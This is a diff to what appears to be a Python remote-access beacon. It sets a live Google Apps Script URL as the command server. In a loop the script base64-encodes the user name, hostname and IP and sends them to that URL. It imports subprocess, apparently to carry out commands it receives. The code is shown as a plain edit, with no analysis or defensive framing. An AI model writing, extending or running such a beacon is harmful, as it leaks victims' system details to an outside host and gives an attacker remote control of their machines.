@@ -1,4 +1,4 @@
-srv=['']
+srv=['https://script.google.com/macros/s/AKfycbxz0-5nlyuNgAwQwIu9aub0P9tCYZqMLtfrTSPWc9M7XTM-YGuQ/exec']
 import sys,time,base64,socket,random,getpass,subprocess
 if sys.version_info.major==2:
  import urllib as parse
@@ -22,7 +22,7 @@ def _p(s,d):
 while 1:
  try:
   s_i=0
-  u=_g(srv[s_i],{'i':base64.b64encode('|'.join([getpass.getuser(),socket.gethostbyname(socket.gethostname()),socket.gethostname()]).encode(X)).decode(X)})
+  u=_g(srv[s_i],{'i':base64.b64encode('|'.join([getpass.getuser(),socket.gethostname(),socket.gethostbyname(socket.gethostname())]).encode(X)).decode(X)})
   while 1:
    b=[]
    s_i=(s_i+1)%len(srv)
